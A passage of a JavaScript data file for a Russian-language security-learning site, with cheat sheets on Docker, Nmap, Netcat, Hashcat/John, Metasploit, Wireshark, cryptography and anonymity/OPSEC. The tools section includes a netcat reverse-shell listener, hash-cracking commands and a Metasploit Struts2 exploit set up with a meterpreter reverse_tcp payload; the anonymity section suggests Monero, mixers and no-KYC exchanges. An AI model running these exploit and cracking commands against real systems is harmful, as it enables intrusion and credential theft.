                        <li>fix/* — багфиксы</li>
                        <li>hotfix/* — срочные правки</li>
                    </ul>
                `
            },
            {
                title: '🐳 Docker',
                content: `
                    <h3>Основные команды</h3>
                    <pre><code>docker ps -a
docker images
docker build -t name .
docker run -d --name web -p 80:80 nginx
docker exec -it container sh
docker logs -f container
docker cp file.txt container:/tmp/
docker compose up -d
docker compose down
docker system prune -a</code></pre>
                `
            },
            {
                title: '🛡️ Nmap',
                content: `
                    <h3>Сканирование портов</h3>
                    <pre><code># Базовое
nmap 192.168.1.1
nmap -sV 192.168.1.1    # версии сервисов
nmap -sC 192.168.1.1    # скрипты
nmap -A 192.168.1.1     # агрессивное

# Продвинутое
nmap -p- 192.168.1.1    # все порты (65535)
nmap -sU 192.168.1.1    # UDP
nmap -sS 192.168.1.1    # SYN scan (stealth)

# Со сканами
nmap --script vuln 192.168.1.1
nmap --script http-enum 192.168.1.1</code></pre>
                `
            },
            {
                title: '🎯 Burp Suite',
                content: `
                    <h3>Burp Suite функции</h3>
                    <ul>
                        <li><strong>Proxy</strong> — перехват HTTP/HTTPS трафика</li>
                        <li><strong>Repeater</strong> — повторение запросов</li>
                        <li><strong>Intruder</strong> — брутфорс, фаззинг</li>
                        <li><strong>Decoder</strong> — кодирование/декодирование</li>
                        <li><strong>Comparer</strong> — сравнение запросов</li>
                        <li><strong>Scanner</strong> — автоматический поиск уязвимостей (Pro)</li>
                        <li><strong>Extender</strong> — плагины (разметка, активные сканы)</li>
                    </ul>
                `
            },
            {
                title: '⚡ Netcat',
                content: `
                    <h3>Швейцарский нож</h3>
                    <pre><code># Слушать порт (reverse shell listener)
nc -lvnp 4444

# Подключиться
nc example.com 80

# Передача файла
# Отправитель:
nc -lvnp 4444 < file.txt
# Получатель:
nc target 4444 > received.txt

# Порт-сканирование
nc -zv 192.168.1.1 22-1000

# Чат
# Слушатель:
nc -lvnp 5555
# Клиент:
nc target 5555</code></pre>
                `
            },
            {
                title: '🔐 Hashcat / John',
                content: `
                    <h3>Взлом хэшей</h3>
                    <pre><code># Hashcat
hashcat -m 0 -a 0 hash.txt rockyou.txt    # MD5
hashcat -m 1000 -a 0 hash.txt rockyou.txt  # NTLM
hashcat -m 13100 -a 0 hash.txt rockyou.txt # Kerberos TGS

# John
john --wordlist=rockyou.txt hash.txt

# Режимы
-a 0  # словарная
-a 3  # маска (brute force)</code></pre>
                    <p><strong>Совет:</strong> используй rule-based атаки — они гораздо эффективнее простого словаря.</p>
                `
            },
            {
                title: '🔧 Metasploit',
                content: `
                    <h3>Metasploit Framework</h3>
                    <pre><code>msfconsole

# Поиск эксплойта
search type:exploit target:linux

# Использовать модуль
use exploit/multi/http/struts2_content_type_ognl
show options
set RHOSTS target.com
run

# Payload
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.0.0.1
set LPORT 4444</code></pre>
                    <ul>
                        <li><strong>Модули</strong> — exploit, payload, auxiliary, post, encoder</li>
                        <li><strong>Meterpreter</strong> — продвинутый payload (загрузка, дамп, скриншоты)</li>
                        <li><strong>Resource scripts</strong> — автоматизация (.rc файлы)</li>
                    </ul>
                `
            },
            {
                title: '🌐 Wireshark',
                content: `
                    <h3>Анализ трафика</h3>
                    <ul>
                        <li><strong>Фильтры захвата</strong> — port 80, host 1.1.1.1</li>
                        <li><strong>Фильтры отображения</strong> — http.request, ip.addr==x</li>
                        <li><strong>Follow TCP Stream</strong> — собрать всю HTTP сессию</li>
                        <li><strong>Статистика</strong> — протоколы, диалоги, IO Graph</li>
                    </ul>
                    <pre><code># Полезные фильтры Wireshark
http.request
http.response.code == 200
dns.qry.name contains "example"
ip.src == 192.168.1.1 and tcp.port == 80
tcp.flags.syn == 1 and tcp.flags.ack == 0</code></pre>
                `
            }
        ]
    },
    {
        id: 'crypto',
        icon: '🔐',
        title: 'Криптография',
        desc: 'Основы шифрования, GPG, SSL/TLS, хэширование, симметричное и асимметричное шифрование, криптоанализ.',
        count: '6',
        submodules: [
            {
                title: '📖 Основы криптографии',
                content: `
                    <h3>Виды криптографии</h3>
                    <ul>
                        <li><strong>Симметричная</strong> — AES-256, ChaCha20 (один ключ, быстро)</li>
                        <li><strong>Асимметричная</strong> — RSA-4096, ECC (пара ключей, медленно)</li>
                        <li><strong>Хэширование</strong> — SHA-256, SHA-3, bcrypt, argon2 (необратимо)</li>
                        <li><strong>Гибридная</strong> — TLS, GPG (симметричный ключ шифруется асимметрично)</li>
                    </ul>
                    <p><strong>Важно:</strong> никогда не придумывай свою криптографию. Используй проверенные стандарты и библиотеки.</p>
                `
            },
            {
                title: '🔑 GPG / OpenPGP',
                content: `
                    <h3>GNU Privacy Guard</h3>
                    <pre><code># Генерация ключа
gpg --full-generate-key

# Список ключей
gpg --list-keys
gpg --list-secret-keys

# Экспорт публичного ключа
gpg --export -a "Name" > pubkey.asc

# Импорт чужого ключа
gpg --import pubkey.asc

# Шифрование
gpg -e -r "Name" file.txt

# Расшифровка
gpg -d file.txt.gpg

# Подпись
gpg -s file.txt

# Проверка подписи
gpg --verify file.txt.sig</code></pre>
                `
            },
            {
                title: '🌐 SSL/TLS',
                content: `
                    <h3>Что такое TLS?</h3>
                    <p>Transport Layer Security — протокол шифрования канала связи. HTTPS = HTTP + TLS.</p>
                    <ul>
                        <li><strong>Сертификаты</strong> — LetsEncrypt (бесплатно, 90 дней)</li>
                        <li><strong>mTLS</strong> — взаимная аутентификация (клиент + сервер)</li>
                        <li><strong>HSTS</strong> — принудительный HTTPS через заголовок</li>
                        <li><strong>Certificate Pinning</strong> — привязка сертификата</li>
                    </ul>
                    <pre><code># Проверка TLS
echo | openssl s_client -connect example.com:443 2>/dev/null | openssl x509 -text

# LetsEncrypt (certbot)
certbot certonly --standalone -d example.com</code></pre>
                `
            },
            {
                title: '🔐 Хэширование',
                content: `
                    <h3>Виды хэшей</h3>
                    <ul>
                        <li><strong>SHA-256 / SHA-3</strong> — для целостности</li>
                        <li><strong>bcrypt</strong> — для паролей (медленный, с солью)</li>
                        <li><strong>argon2</strong> — современный (победитель Password Hashing Competition)</li>
                        <li><strong>scrypt</strong> — устойчив к ASIC</li>
                    </ul>
                    <h3>Проверка хэшей</h3>
                    <pre><code># Создание хэша
echo -n "password" | sha256sum
echo -n "password" | md5sum

# bcrypt (Python)
import bcrypt
hash = bcrypt.hashpw(b"password", bcrypt.gensalt())
bcrypt.checkpw(b"password", hash)</code></pre>
                    <p><strong>Никогда не храни пароли</strong> в MD5, SHA-1 или unsalted SHA-256. Используй argon2 или bcrypt.</p>
                `
            },
            {
                title: '🔏 Цифровые подписи',
                content: `
                    <h3>Как работают подписи</h3>
                    <p>Хэш документа шифруется приватным ключом. Любой может проверить подпись публичным ключом.</p>
                    <ul>
                        <li><strong>RSA Signatures</strong> — RS256, RS384, RS512</li>
                        <li><strong>ECDSA</strong> — ES256, ES384 (на эллиптических кривых)</li>
                        <li><strong>EdDSA</strong> — Ed25519 (современный, быстрый)</li>
                    </ul>
                    <pre><code># GPG подпись
gpg -s file.txt
gpg --verify file.txt.gpg

# OpenSSL подпись
openssl dgst -sha256 -sign private.pem -out signature.bin file.txt
openssl dgst -sha256 -verify public.pem -signature signature.bin file.txt</code></pre>
                `
            },
            {
                title: '🧪 Криптоанализ',
                content: `
                    <h3>Атаки на шифры</h3>
                    <ul>
                        <li><strong>Brute force</strong> — перебор ключей (неэффективно для AES)</li>
                        <li><strong>Rainbow tables</strong> — предвычисленные хэши (соль спасает)</li>
                        <li><strong>Side-channel</strong> — время, питание, звук, электромагнитное излучение</li>
                        <li><strong>Padding oracle</strong> — раскрытие данных через оракул паддинга</li>
                        <li><strong>Frequency analysis</strong> — для простых шифров (Цезарь, Виженер)</li>
                    </ul>
                    <p>Криптоанализ AES-256 сегодня невозможен на классических компьютерах. Квантовые — другая история (Grover\'s algorithm).</p>
                `
            }
        ]
    },
    {
        id: 'anon',
        icon: '🎭',
        title: 'Анонимность',
        desc: 'Tor, VPN, прокси, OPSEC, приватность, метаданные, безопасная работа в сети, криптовалюты.',
        count: '7',
        submodules: [
            {
                title: '🎭 Принципы OPSEC',
                content: `
                    <h3>Operations Security</h3>
                    <ul>
                        <li><strong>Разделяй активности</strong> — разные профили для разного (работа, личное, хобби)</li>
                        <li><strong>Минимум данных</strong> — не оставляй след без нужды</li>
                        <li><strong>Не верь в полную анонимность</strong> — её не существует</li>
                        <li><strong>Compartmentalization</strong> — утечка одной активности не роняет все</li>
                        <li><strong>Threat model</strong> — от кого ты прячешься? Режим, спецслужбы, хакеры?</li>
                    </ul>
                    <p>OPSEC — это не инструменты, это образ мышления. Инструменты лишь помогают.</p>
                `
            },
            {
                title: '🔧 Инструменты анонимности',
                content: `
                    <h3>Основные инструменты</h3>
                    <ul>
                        <li><strong>Tor Browser</strong> — анонимный веб (луковичная маршрутизация)</li>
                        <li><strong>Tails OS</strong> — RAM-only ОС, не оставляет следов</li>
                        <li><strong>Whonix</strong> — Gateway (Tor) + Workstation (изолированная)</li>
                        <li><strong>Proton VPN / Mullvad</strong> — VPN без логов</li>
                        <li><strong>ProtonMail / Tutanota</strong> — приватная почта</li>
                        <li><strong>Signal</strong> — мессенджер с шифрованием</li>
                    </ul>
                    <p>Комбинация Tor + VPN (Tor over VPN или VPN over Tor) — разные подходы с разными трейд-оффами.</p>
                `
            },
            {
                title: '📸 Метаданные',
                content: `
                    <h3>Опасность метаданных</h3>
                    <p>Фото содержит: GPS-координаты, модель камеры, дату и время, софт для обработки, серийный номер камеры.</p>
                    <pre><code># Удалить все метаданные
exiftool -all= photo.jpg

# Или (ImageMagick)
convert photo.jpg -strip clean.jpg

# Смотреть метаданные
exiftool photo.jpg
identify -verbose photo.jpg</code></pre>
                    <h3>Автоматическая очистка</h3>
                    <p>Используй <strong>MAT (Metadata Anonymisation Toolkit)</strong> — автоматически чистит файлы перед публикацией.</p>
                `
            },
            {
                title: '🌐 Tor Browser',
                content: `
                    <h3>Как работает Tor</h3>
                    <ul>
                        <li>Трафик проходит через 3 реле (Guard, Middle, Exit)</li>
                        <li>Каждый узел знает только предыдущий и следующий</li>
                        <li>Exit нода может видеть твой трафик (используй HTTPS!)</li>
                        <li>.onion сайты — скрытые сервисы</li>
                    </ul>
                    <h3>Настройка безопасности</h3>
                    <ul>
                        <li>Уровень безопасности: Standard → Safer → Safest</li>
                        <li>Отключи JavaScript для Safest (много сайтов сломается)</li>
                        <li>Не меняй размер окна — это уникализирует fingerprint</li>
                        <li>Не логинься в соцсети через Tor</li>
                    </ul>
                `
            },
            {
                title: '💸 Криптовалюты',
                content: `
                    <h3>Анонимные платежи</h3>
                    <p>Биткоин — НЕ анонимен. Все транзакции публичны в блокчейне. Используй Monero для приватности.</p>
                    <ul>
                        <li><strong>Monero (XMR)</strong> — скрытые отправитель, получатель, сумма</li>
                        <li><strong>Bitcoin + Tumbler</strong> — микшеры (ненадёжно)</li>
                        <li><strong>Zcash (ZEC)</strong> — shielded транзакции (zk-SNARKs)</li>
                        <li><strong>Локальные обменники</strong> — p2p, без KYC</li>
                    </ul>
                    <p>Если нужна анонимность — используй Monero. Если нужен Bitcoin — используй для замешивания.</p>
                `
            },
            {
                title: '📱 Анонимный доступ',
                content: `
                    <h3>Как оставаться анонимным</h3>
                    <ul>
                        <li><strong>Браузер</strong> — Tor Browser, Brave (с прокладкой через Tor)</li>
                        <li><strong>Поиск</strong> — DuckDuckGo, SearX</li>
                        <li><strong>Почта</strong> — ProtonMail, Tutanota (анонимная регистрация)</li>
                        <li><strong>Мессенджеры</strong> — Signal (номер не обязателен в Session)</li>
                        <li><strong>Номер телефона</strong> — виртуальные номера (Google Voice, SIP)</li>
                        <li><strong>VPN</strong> — Mullvad, ProtonVPN (принимают Monero)</li>
                    </ul>
                `
            },
            {
                title: '⚠️ Компромат',
                content: `
                    <h3>Что тебя рассекретит</h3>
                    <ul>
                        <li><strong>Fingerprint браузера</strong> — canvas, WebGL, шрифты, разрешение</li>
                        <li><strong>Логины на сайтах</strong> — email/телефон привязан к профилю</li>
                        <li><strong>IP утечки</strong> — WebRTC, загрузка ресурсов без прокси</li>
                        <li><strong>Время активности</strong> — по времени постов можно вычислить часовой пояс</li>
                        <li><strong>Стиль письма</strong> — стеганография авторства (Stylometry)</li>
                        <li><strong>Социальные связи</strong> — друзья, репосты, комментарии</li>
                    </ul>
                    <p><strong>Совет:</strong> используй разные пароли, разные username, разные email для разных активностей. Compartmentalization — ключ к анонимности.</p>
                `
            }
        ]
    }
];


/**
 * Статические статьи — добавляются в репозиторий и видны всем посетителям.
 * Формат:
 *   title: string,        // заголовок
 *   type: 'TXT'|'HTML',   // тип контента
 *   content: string,      // HTML-контент
 *   date: string,         // дата публикации
 *   static: true          // флаг статической статьи (без кнопки удаления в UI)
 *
 * PDF через статику не поддерживается — используй HTML.
 */
const STATIC_ARTICLES = [
    {
        title: '💡 Как добавлять статьи',
        type: 'HTML',
        content: `
            <h3>Как добавить свою статью</h3>
            <p>Отредактируй <code>data.js</code> в репозитории <code>memorialDesacratio.github.io</code>.</p>
            <p>Найди массив <code>STATIC_ARTICLES</code> в конце файла и добавь туда новый объект:</p>
            <pre><code>{
    title: 'Название',
    type: 'HTML',
    content: '&lt;p&gt;Текст&lt;/p&gt;',
    date: '28 мая 2026',
    static: true
}</code></pre>
            <p>После добавления — запуши изменения. GitHub Pages обновит сайт через пару минут.</p>
            <p>Не забудь <code>static: true</code> — это скрывает кнопку удаления для обычных посетителей.</p>
        `,
        date: '28 мая 2026',
        static: true
    }
];
